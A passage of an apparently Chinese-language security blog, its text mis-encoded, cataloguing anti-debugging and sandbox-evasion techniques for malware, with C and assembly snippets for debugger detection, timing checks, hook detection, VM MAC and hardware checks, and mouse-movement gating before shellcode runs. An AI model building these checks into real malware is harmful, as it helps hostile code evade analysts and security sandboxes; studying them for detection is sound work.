HANDLE hdebugObject &#x3D; NULL;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL);  </span><br><span class="line">    return hdebugObject !&#x3D; NULL;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    BOOL bdebugFlag &#x3D; TRUE;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL);  </span><br><span class="line">    return bdebugFlag !&#x3D; TRUE;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="æ£€æµ‹è½¯ä»¶æ–­ç‚¹"><a href="#æ£€æµ‹è½¯ä»¶æ–­ç‚¹" class="headerlink" title="æ£€æµ‹è½¯ä»¶æ–­ç‚¹"></a>æ£€æµ‹è½¯ä»¶æ–­ç‚¹</h5><p>å½“æˆ‘ä»¬åœ¨è°ƒè¯•å™¨ä¸­å¯¹ä¸€è¡Œä»£ç æ‰“ä¸Šæ–­ç‚¹æ—¶ï¼Œå®è´¨ä¸Šæ˜¯å°†è¿™è¡Œä»£ç æ”¹ä¸ºäº†0xccï¼Œå³INT 3ï¼Œä¸­æ–­å¼‚å¸¸ï¼Œæ‰€ä»¥è°ƒè¯•å™¨è¿è¡Œåˆ°æ­¤å¤„æ—¶ä¼šåœæ­¢ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ£€æµ‹ä»£ç ä¸­æ˜¯å¦æœ‰0xccæ¥åˆ¤æ–­æ˜¯å¦è¢«æ‰“ä¸Šäº†è½¯ä»¶æ–­ç‚¹ï¼Œä»è€Œèµ·åˆ°åè°ƒè¯•çš„ä½œç”¨ã€‚</p><p>è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨æ±‡ç¼–ä»£ç ä¸­çš„ repne scasb æŒ‡ä»¤ï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¼“å†²åŒºçš„èµ·å§‹åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¼“å†²åŒºå¤§å°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚å®ƒä¼šåœ¨æŒ‡å®šçš„ç¼“å†²åŒºå†…å¯»æ‰¾å­—ç¬¦ä¸²ï¼Œè‹¥æ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›.</p><h5 id="æ—¶é—´æ£€æµ‹"><a href="#æ—¶é—´æ£€æµ‹" class="headerlink" title="æ—¶é—´æ£€æµ‹"></a>æ—¶é—´æ£€æµ‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int t1 &#x3D; GetTickCount64();</span><br><span class="line">Hack(); &#x2F;&#x2F;ä¸€ä¸ªå‡½æ•°ï¼Œè¯±å¯¼åˆ†æäººå‘˜åœ¨è°ƒè¯•çš„æ—¶å€™è·Ÿè¿›è¿›å»è€½è¯¯æ—¶é—´</span><br><span class="line">int t2 &#x3D; GetTickCount64();</span><br><span class="line">if (((t2 - t1) &#x2F; 1000) &gt; 5) &#123;</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;  &#x2F;&#x2F;t1,t2æ£€æµ‹æ—¶é—´è¿‡å¤§åˆ™ä¼šæ˜¯è°ƒè¯•</span><br><span class="line"></span><br><span class="line">wprintf_s(L&quot;Now hacking more...\n&quot;);</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥ç”¨å†…è”æ±‡ç¼–å®Œæˆ</span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    DWORD time1, time2;  </span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        rdtsc  </span><br><span class="line">        mov time1, eax</span><br><span class="line">        ........åƒåœ¾ä»£ç ï¼Œè€½è¯¯åˆ†æäººå‘˜æ—¶é—´</span><br><span class="line">        rdtsc  </span><br><span class="line">        mov time2, eax  </span><br><span class="line">    &#125;  </span><br><span class="line">    if (time2 - time1 &lt; 0xff)  </span><br><span class="line">    &#123;  </span><br><span class="line">        return FALSE;  </span><br><span class="line">    &#125;  </span><br><span class="line">    else  </span><br><span class="line">    &#123;  </span><br><span class="line">        return TRUE;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="æ£€æµ‹çˆ¶è¿›ç¨‹"><a href="#æ£€æµ‹çˆ¶è¿›ç¨‹" class="headerlink" title="æ£€æµ‹çˆ¶è¿›ç¨‹"></a>æ£€æµ‹çˆ¶è¿›ç¨‹</h5><p>è§æ²™ç®±ç»•è¿‡ç« èŠ‚ä¸­çš„â€œæ£€æµ‹çˆ¶è¿›ç¨‹â€</p><h5 id="SEHä¸­æ–­"><a href="#SEHä¸­æ–­" class="headerlink" title="SEHä¸­æ–­"></a>SEHä¸­æ–­</h5><p>ä¸æ˜¯å¾ˆæ‡‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void AD_BreakPoint()  </span><br><span class="line">&#123;  </span><br><span class="line">    printf(&quot;SEH : BreakPoint\n&quot;);  </span><br><span class="line">   </span><br><span class="line">    __asm &#123;  </span><br><span class="line">        &#x2F;&#x2F; install SEH  </span><br><span class="line">        push handler  </span><br><span class="line">        push DWORD ptr fs:[0]  </span><br><span class="line">        mov DWORD ptr fs:[0], esp  </span><br><span class="line">           </span><br><span class="line">        &#x2F;&#x2F; generating exception  </span><br><span class="line">        int 3  </span><br><span class="line">   </span><br><span class="line">        &#x2F;&#x2F; 1) debugging  </span><br><span class="line">        &#x2F;&#x2F;    go to terminating code  </span><br><span class="line">        mov eax, 0xFFFFFFFF  </span><br><span class="line">        jmp eax                 &#x2F;&#x2F; process terminating!!!  </span><br><span class="line">   </span><br><span class="line">        &#x2F;&#x2F; 2) not debugging  </span><br><span class="line">        &#x2F;&#x2F;    go to normal code  </span><br><span class="line">handler:  </span><br><span class="line">        mov eax, dword ptr ss:[esp+0xc]  </span><br><span class="line">        mov ebx, normal_code  </span><br><span class="line">        mov dword ptr ds:[eax+0xb8], ebx  </span><br><span class="line">        xor eax, eax  </span><br><span class="line">        retn  </span><br><span class="line">   </span><br><span class="line">normal_code:  </span><br><span class="line">        &#x2F;&#x2F;   remove SEH  </span><br><span class="line">        pop dword ptr fs:[0]  </span><br><span class="line">        add esp, 4  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    printf(&quot;  &#x3D;&gt; Not debugging...\n\n&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">int _tmain(int argc, TCHAR* argv[])  </span><br><span class="line">&#123;  </span><br><span class="line">    AD_BreakPoint();  </span><br><span class="line">   </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ²™ç®±ç»•è¿‡ï¼ˆSandbox-Evasionï¼‰"><a href="#æ²™ç®±ç»•è¿‡ï¼ˆSandbox-Evasionï¼‰" class="headerlink" title="æ²™ç®±ç»•è¿‡ï¼ˆSandbox Evasionï¼‰"></a>æ²™ç®±ç»•è¿‡ï¼ˆSandbox Evasionï¼‰</h3><h4 id="System-Checks"><a href="#System-Checks" class="headerlink" title="System Checks"></a>System Checks</h4><p>æ£€æµ‹å½“å‰ç¯å¢ƒæ˜¯å¦æ˜¯æ²™ç®±ç¯å¢ƒï¼Œå¦‚æœæ˜¯æ²™ç®±åˆ™ä¸è¡¨ç°å‡ºæ¶æ„è¡Œä¸ºã€‚</p><h5 id="æ£€æµ‹å‡½æ•°æ˜¯å¦è¢«HOOKæ›´æ”¹"><a href="#æ£€æµ‹å‡½æ•°æ˜¯å¦è¢«HOOKæ›´æ”¹" class="headerlink" title="æ£€æµ‹å‡½æ•°æ˜¯å¦è¢«HOOKæ›´æ”¹"></a>æ£€æµ‹å‡½æ•°æ˜¯å¦è¢«HOOKæ›´æ”¹</h5><p>æœ‰äº›æ²™ç®±ä¼šå¯¹ä¸€äº›å‡½æ•°è¿›è¡ŒHOOKæ›´æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨åŸDLLä¸­æŸ¥æ‰¾åŸå‡½æ•°ä¸è¿›ç¨‹ä¸­çš„å‡½æ•°è¿›è¡Œæ¯”å¯¹ä»è€Œåˆ¤æ–­å…¶æ˜¯å¦è¢«HOOK.<br>è¿™é‡Œæ˜¯åˆ«äººçš„ä»£ç (RedTeaming)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; manually load the dll</span><br><span class="line">HANDLE dllFile &#x3D; CreateFileW(L&quot;C:\\Windows\\System32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line">DWORD dllFileSize &#x3D; GetFileSize(dllFile, NULL);</span><br><span class="line">HANDLE hDllFileMapping &#x3D; CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);</span><br><span class="line">HANDLE pDllFileMappingBase &#x3D; MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);</span><br><span class="line">CloseHandle(dllFile);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; analyze the dll</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader &#x3D; (PIMAGE_DOS_HEADER)pDllFileMappingBase;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader &#x3D; (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptionalHeader &#x3D; (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportDirectory &#x3D; (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PULONG pAddressOfFunctions &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">PULONG pAddressOfNames &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">PUSHORT pAddressOfNameOrdinals &#x3D; (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; find the original function code</span><br><span class="line">PVOID pNtCreateThreadExOriginal &#x3D; NULL;</span><br><span class="line">for (int i &#x3D; 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)</span><br><span class="line">&#123;</span><br><span class="line">PCSTR pFunctionName &#x3D; (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);</span><br><span class="line">if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;))</span><br><span class="line">&#123;</span><br><span class="line">pNtCreateThreadExOriginal &#x3D; (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; compare functions</span><br><span class="line">PVOID pNtCreateThreadEx &#x3D; GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);</span><br><span class="line">if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;</span><br></pre></td></tr></table></figure><h5 id="GetTickCount"><a href="#GetTickCount" class="headerlink" title="GetTickCount"></a>GetTickCount</h5><p>GetTickCount æ˜¯win32 APIä¹‹ä¸€ï¼Œç”¨æ¥è®°å½•ç”µè„‘å¼€æœºåçš„è¿è¡Œæ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ£€æµ‹å½“å‰ç¯å¢ƒçš„è¿è¡Œæ—¶é—´ï¼Œå¦‚æœæ—¶é—´å¾ˆçŸ­é‚£ä¹ˆå°±æœ‰å¯èƒ½æ˜¯æ²™ç®±ã€‚</p><p>ä¸ºä»€ä¹ˆæ—¶é—´å¾ˆçŸ­å°±å¯èƒ½æ˜¯æ²™ç®±ç¯å¢ƒå‘¢ï¼Ÿæ²™ç®±å¯¹æ¶æ„ç¨‹åºçš„æ£€æµ‹æµç¨‹å¤§è‡´å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.å¯åŠ¨è™šæ‹Ÿç¯å¢ƒ</span><br><span class="line">2.å°†æ¶æ„ç¨‹åºå¤åˆ¶è¿›è™šæ‹Ÿç¯å¢ƒ</span><br><span class="line">3.è¿è¡Œæ¶æ„ç¨‹åºä¸€æ®µæ—¶é—´ï¼ˆä¸€èˆ¬ä¸º5åˆ†é’Ÿï¼‰</span><br><span class="line">4.è·å–è™šæ‹Ÿç¯å¢ƒè¿”å›çš„æŠ¥å‘Š</span><br><span class="line">5.å…³æœº</span><br></pre></td></tr></table></figure><p>å…¨ç¨‹ä¸è¿‡6.7åˆ†é’Ÿï¼Œè€Œæ­£å¸¸çš„æœºå™¨è¿è¡Œæ—¶é—´è‚¯å®šæ˜¯å¤§äºè¿™ä¸ªå€¼çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®šä¸€ä¸ªæ ‡å‡†ï¼šå¦‚æœGetTickCountè¿”å›çš„å€¼å°äº10minï¼Œé‚£ä¹ˆå°±è¢«åˆ¤ä¸ºæ²™ç®±ç¯å¢ƒã€‚</p><h5 id="CPU-RAMç­‰ä¿¡æ¯"><a href="#CPU-RAMç­‰ä¿¡æ¯" class="headerlink" title="CPU,RAMç­‰ä¿¡æ¯"></a>CPU,RAMç­‰ä¿¡æ¯</h5><p>æ²™ç®±çš„CPUIå¤šä¸º1æ ¸ï¼Œramå¤šå°äº2gï¼Œç¡¬ç›˜å¤§å°å¤šå°äº100gã€‚æˆ‘ä»¬å¯ä»¥ä»¥æ­¤ä¸ºä¸€ä¸ªåŸºå‡†è¿›è¡Œæ²™ç®±æ£€æµ‹ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;cpu processors</span><br><span class="line">SYSTEM_INFO systeminfo;</span><br><span class="line">GetSystemInfo(&amp;systeminfo);</span><br><span class="line">DWORD numberOfProcessors &#x3D; systeminfo.dwNumberOfProcessors;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ram</span><br><span class="line">MEMORYSTATUSEX memoryStatus;</span><br><span class="line">memoryStatus.dwLength &#x3D; sizeof(memoryStatus);</span><br><span class="line">GlobalMemoryStatusEx(&amp;memoryStatus);</span><br><span class="line">DWORD RAMMB &#x3D; memoryStatus.ullTotalPhys &#x2F; 1024 &#x2F; 1024;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;hdd(ç¡¬ç›˜å¤§å°)</span><br><span class="line">HANDLE hDevice &#x3D; CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);</span><br><span class="line">DWORD diskSizeGB;</span><br><span class="line">diskSizeGB &#x3D; pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector &#x2F; 1024 &#x2F; 1024 &#x2F; 1024;</span><br><span class="line"></span><br><span class="line">printf(&quot;cpu:%d,ram:%d,size(gb):%d&quot;, numberOfProcessors, RAMMB, diskSizeGB);</span><br></pre></td></tr></table></figure><h5 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h5><p>å¸¸è§è™šæ‹Ÿæœºå¦‚vmwareï¼Œviturl boxç­‰éƒ½æœ‰ç‰¹æ®Šçš„macåœ°å€ï¼Œå¯ä»¥ä»¥æ­¤ä¸ºä¾æ®åˆ¤æ–­æ˜¯å¦åœ¨è™šæ‹Ÿæœºä¸­ï¼ˆéšç€è™šæ‹ŸåŒ–ä¸»æœºè¶Šæ¥è¶Šæ™®éï¼Œè®¸å¤šå…¬å¸å°†ä¸šåŠ¡ç³»ç»Ÿä¹Ÿæ¬è¿›äº†è™šæ‹Ÿæœºï¼Œè¿™ä¸ªæ–¹æ³•å·²ä¸å¤ªèƒ½ä½œä¸ºæ£€æµ‹æ²™ç®±çš„æŒ‡æ ‡ï¼‰</p><p>â€œé€šå¸¸ï¼ŒMACåœ°å€çš„å‰ä¸‰ä¸ªå­—èŠ‚æ ‡è¯†ä¸€ä¸ªæä¾›å•†ã€‚ä»¥00:05:69ã€00:0c:29å’Œ00:50:56å¼€å§‹çš„MACåœ°å€ä¸VMwareç›¸å¯¹åº”ï¼›ä»¥00:03:ffå¼€å§‹çš„MACåœ°å€ä¸virtualpcå¯¹åº”ï¼›ä»¥08:00:27å¼€å§‹çš„MACåœ°å€ä¸virtualboxå¯¹åº”ã€‚â€</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">string mac;</span><br><span class="line">    get_3part_mac(mac);</span><br><span class="line">    if (mac &#x3D;&#x3D; &quot;00-05-69&quot; || mac &#x3D;&#x3D; &quot;00-0c-29&quot; || mac &#x3D;&#x3D; &quot;00-50-56&quot; || mac &#x3D;&#x3D; &quot;00-03-ff&quot; || mac &#x3D;&#x3D; &quot;08-00-27&quot;) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">void get_3part_mac(string &amp;mac)  </span><br><span class="line">&#123;  </span><br><span class="line">    NCB Ncb;  </span><br><span class="line">    ASTAT Adapter;  </span><br><span class="line">    UCHAR uRetCode;  </span><br><span class="line">    LANA_ENUM lenum;  </span><br><span class="line">    memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">    Ncb.ncb_command &#x3D; NCBENUM;  </span><br><span class="line">    Ncb.ncb_buffer &#x3D; (UCHAR *)&amp;lenum;  </span><br><span class="line">    Ncb.ncb_length &#x3D; sizeof(lenum);  </span><br><span class="line">    uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">    for (int i &#x3D; 0; i &lt; lenum.length; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">        Ncb.ncb_command &#x3D; NCBRESET;  </span><br><span class="line">        Ncb.ncb_lana_num &#x3D; lenum.lana[i];  </span><br><span class="line">        uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">        memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">        Ncb.ncb_command &#x3D; NCBASTAT;  </span><br><span class="line">        Ncb.ncb_lana_num &#x3D; lenum.lana[i];  </span><br><span class="line">        strcpy((char *)Ncb.ncb_callname, &quot;*&quot;);  </span><br><span class="line">        Ncb.ncb_buffer &#x3D; (unsigned char *)&amp;Adapter;  </span><br><span class="line">        Ncb.ncb_length &#x3D; sizeof(Adapter);  </span><br><span class="line">        uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">        if (uRetCode &#x3D;&#x3D; 0)  </span><br><span class="line">        &#123;  </span><br><span class="line">            char tmp[128];  </span><br><span class="line">            sprintf(tmp, &quot;%02x-%02x-%02x&quot;,  </span><br><span class="line">                Adapter.adapt.adapter_address[0],  </span><br><span class="line">                Adapter.adapt.adapter_address[1],  </span><br><span class="line">                Adapter.adapt.adapter_address[2]  </span><br><span class="line">            );  </span><br><span class="line">            mac &#x3D; tmp;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="åˆ†è¾¨ç‡"><a href="#åˆ†è¾¨ç‡" class="headerlink" title="åˆ†è¾¨ç‡"></a>åˆ†è¾¨ç‡</h5><p>æ²™ç®±çš„åˆ†è¾¨ç‡éƒ½ä¸å¤ªæ­£å¸¸</p><h5 id="æ£€æŸ¥æ—¶åŒºä¸æ—¶é—´æµåŠ¨æ€§"><a href="#æ£€æŸ¥æ—¶åŒºä¸æ—¶é—´æµåŠ¨æ€§" class="headerlink" title="æ£€æŸ¥æ—¶åŒºä¸æ—¶é—´æµåŠ¨æ€§"></a>æ£€æŸ¥æ—¶åŒºä¸æ—¶é—´æµåŠ¨æ€§</h5><p>æ²™ç®±å¾€å¾€ä¼šåŠ é€Ÿè¿è¡Œæ–‡ä»¶ï¼Œæ•…å¯ä»¥æ£€æŸ¥æ—¶é—´æµåŠ¨æ€§æ˜¯å¦æ­£å¸¸ä»è€Œæ£€æµ‹æ²™ç®±</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F;æ—¶åŒº</span><br><span class="line">    DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo;</span><br><span class="line">    GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo);</span><br><span class="line">    wchar_t wcTimeZoneName[128 + 1];</span><br><span class="line">    StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName);</span><br><span class="line">    CharUpperW(wcTimeZoneName);</span><br><span class="line">    if (!wcsstr(wcTimeZoneName, L&quot;CHINA STANDARD TIME&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;æµåŠ¨æ€§</span><br><span class="line">    clock_t ClockStartTime, ClockEndTime;</span><br><span class="line">    time_t UnixStartTime &#x3D; time(0);</span><br><span class="line">    ClockStartTime &#x3D; clock();</span><br><span class="line">    Sleep(10000);</span><br><span class="line">    ClockEndTime &#x3D; clock();</span><br><span class="line">    time_t UnixEndTime &#x3D; time(0);</span><br><span class="line">    int iTimeDifference &#x3D; ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime);</span><br><span class="line">    if (iTimeDifference&gt;150)&#123;</span><br><span class="line">&#x2F;&#x2F;*code</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="æ£€æµ‹æ–‡ä»¶åæ˜¯å¦è¢«æ²™ç®±æ›´æ”¹"><a href="#æ£€æµ‹æ–‡ä»¶åæ˜¯å¦è¢«æ²™ç®±æ›´æ”¹" class="headerlink" title="æ£€æµ‹æ–‡ä»¶åæ˜¯å¦è¢«æ²™ç®±æ›´æ”¹"></a>æ£€æµ‹æ–‡ä»¶åæ˜¯å¦è¢«æ²™ç®±æ›´æ”¹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wchar_t currentProcessPath[MAX_PATH + 1];</span><br><span class="line">GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);</span><br><span class="line">CharUpperW(currentProcessPath);</span><br><span class="line">if (!wcsstr(currentProcessPath, L&quot;evil.EXE&quot;)) return false;</span><br></pre></td></tr></table></figure><h4 id="Time-Based-Evasion"><a href="#Time-Based-Evasion" class="headerlink" title="Time-Based Evasion"></a>Time-Based Evasion</h4><p>åŸºäºæ—¶é—´çš„è§„é¿ã€‚å³æ¶æ„è½¯ä»¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œåå¹¶ä¸ä¼šç«‹åˆ»è¿›è¡Œæ¶æ„è¡ŒåŠ¨ï¼Œè€Œæ˜¯ä¼šä¼ªè£…ã€ä¼‘çœ ä¸€æ®µæ—¶é—´ï¼Œç­‰åˆ°ä¸€å®šæ—¶é—´åå†å¼€å§‹æ¶æ„è¡ŒåŠ¨</p><h5 id="ä½¿ç”¨ç½‘ç»œè¿æ¥å®æ—¶è¯»å–å¯åŠ¨æŒ‡ä»¤"><a href="#ä½¿ç”¨ç½‘ç»œè¿æ¥å®æ—¶è¯»å–å¯åŠ¨æŒ‡ä»¤" class="headerlink" title="ä½¿ç”¨ç½‘ç»œè¿æ¥å®æ—¶è¯»å–å¯åŠ¨æŒ‡ä»¤"></a>ä½¿ç”¨ç½‘ç»œè¿æ¥å®æ—¶è¯»å–å¯åŠ¨æŒ‡ä»¤</h5><p>æ„æ€å°±æ˜¯è¯´è¯¥ç¨‹åºä¼šä¸æ–­å‘æŸä¸ªç½‘å€å‘é€è¯·æ±‚åŒ…ï¼Œå¦‚æœç½‘å€è¿”å›äº†å¯¹åº”çš„å¯åŠ¨æŒ‡ä»¤åˆ™å¼€å§‹è°ƒç”¨æ¶æ„ä»£ç ã€‚</p><p>ä¸‹å›¾æ˜¯ç”¨HTTPè¯·æ±‚è·å–ç½‘é¡µå†…å®¹çš„ä»£ç ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HINTERNET hSession &#x3D; WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">HINTERNET hConnection &#x3D; WinHttpConnect(hSession, L&quot;www.baidu.com&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">HINTERNET hRequest &#x3D; WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);</span><br><span class="line">WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);</span><br><span class="line">WinHttpReceiveResponse(hRequest, 0);</span><br><span class="line">DWORD responseLength;</span><br><span class="line">WinHttpQueryDataAvailable(hRequest, &amp;responseLength);</span><br><span class="line">PVOID response &#x3D; new char[responseLength + 1];</span><br><span class="line">WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);</span><br><span class="line">std::cout &lt;&lt; ((char *)response);</span><br></pre></td></tr></table></figure><h4 id="User-Activity-Based-Checks"><a href="#User-Activity-Based-Checks" class="headerlink" title="User Activity Based Checks"></a>User Activity Based Checks</h4><p>é€šè¿‡æ£€æµ‹ä¸€äº›è¡Œä¸ºï¼Œæ¥è¯†åˆ«å½“å‰å®æ–½è€…æ˜¯å¦ä¸ºäººç±»ã€‚ï¼ˆæ¯”å¦‚åŠ¨é¼ æ ‡ï¼Œæ•²é”®ç›˜ç­‰ï¼Œæˆ–è€…æŸ¥è¯¢ç”µè„‘ä¸Šwordæ–‡æ¡£æ‰“å¼€å†å²æ•°ï¼Œchromeå†å²è®°å½•ç­‰ä¿¡æ¯æ¥åˆ¤æ–­ï¼‰</p><h5 id="é¼ æ ‡ç§»åŠ¨è½¨è¿¹"><a href="#é¼ æ ‡ç§»åŠ¨è½¨è¿¹" class="headerlink" title="é¼ æ ‡ç§»åŠ¨è½¨è¿¹"></a>é¼ æ ‡ç§»åŠ¨è½¨è¿¹</h5><p>å¯ä»¥è®¾ç½®é¼ æ ‡ç§»åŠ¨å¤šå°‘è·ç¦»æ‰æ‰§è¡Œshellcodeï¼Œæ²™ç®±æœ‰äº›æ˜¯æ²¡æœ‰é¼ æ ‡çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POINT CurrentMousePos;</span><br><span class="line">    POINT PreviousMousePos;</span><br><span class="line">    GetCursorPos(&amp;PreviousMousePos);</span><br><span class="line">    double Dis &#x3D; 0;</span><br><span class="line">    while (true)</span><br><span class="line">    &#123;</span><br><span class="line">        GetCursorPos(&amp;CurrentMousePos);</span><br><span class="line">        Dis+&#x3D; sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2));</span><br><span class="line">        Sleep(100);</span><br><span class="line">        if (Dis &gt; 20000) &#123;</span><br><span class="line">&#x2F;&#x2F;*code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="æ£€æµ‹çˆ¶è¿›ç¨‹-1"><a href="#æ£€æµ‹çˆ¶è¿›ç¨‹-1" class="headerlink" 